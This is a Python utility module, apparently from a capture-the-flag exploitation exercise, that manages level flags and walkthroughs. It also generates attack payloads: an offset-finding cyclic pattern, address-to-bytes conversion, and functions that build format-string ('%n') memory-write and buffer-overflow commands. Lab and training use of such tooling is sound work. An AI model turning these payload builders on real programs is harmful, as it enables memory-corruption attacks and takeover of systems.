import os
import subprocess
from pathlib import Path

from utils.text import print_output

DEV_NULL = open(os.devnull, 'w')
PIPE = subprocess.PIPE
PATTERN = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT' \
          'UUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll' \
          'mmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz'


def get_previous_password():
    try:
        prefix = '../'
        if 'Ressources' in os.getcwd():
            prefix = '../../'
        current_level = get_current_level()
        previous_level_num = str(int(current_level[-1:]) - 1).zfill(1)
        previous_level = f'{current_level[:-1]}{previous_level_num}'
        password = Path(f'{prefix}').joinpath(previous_level).joinpath('flag').open().read()
    except FileNotFoundError:
        return None
    return password


def get_current_level_num():
    current_level = get_current_level()
    current_level_num = str(int(current_level[-1:])).zfill(1)
    return current_level_num


def get_current_level():
    level_dir_index = 0
    for i, d in enumerate(os.getcwd().split('/')):
        if 'level' in d or 'bonus' in d:
            level_dir_index = i
            break
    current_level = os.getcwd().split('/')[level_dir_index]
    return current_level


def save_token(token, client=None):
    prefix = ''
    if 'Ressources' in os.getcwd():
        prefix = '../'
    if not token:
        return None
    print_output(token, 'Token to next level')
    if isinstance(token, list):
        token = token[0]
    open(f'{prefix}flag', 'w').write(token.strip())
    if client:
        client.close()
    save_walkthrough()


def save_walkthrough():
    if os.getcwd().split('/')[-1] == 'Ressources':
        subprocess.Popen('p2j break.py -o -t ../walkthrough.ipynb'.split(' '), stdout=DEV_NULL)


def address_to_string(address):
    if isinstance(address, bytes):
        address = str(address)
    if ' ' in address:
        address = address.split(' ')[1]
    address = address.replace("'", '')
    address = address[2:]
    address = address[::-1]
    res = []
    for i, x in enumerate(address):
        if not i % 2:
            if len(address) > i + 1:
                res.append(f'\\x{address[i + 1]}{x}')
            else:
                res.append(f'\\x0{x}')
    return ''.join(res)


def address_to_decimal(address):
    if isinstance(address, int):
        return str(address)
    return int(address, 16)


def get_rewrite_stack_command(target, source, buffer_position, minus=0):
    source = address_to_decimal(source) - minus
    script = f'print "{address_to_string(target)}" + "%{source}d" + "%{buffer_position}$n"'
    return f"python -c '{script}'"


def get_buffer_overflow_command(offset, call_address):
    test_str = '.'
    script = f'print "{test_str}" * {offset} + "{address_to_string(call_address)}"'
    return f"python -c '{script}'"
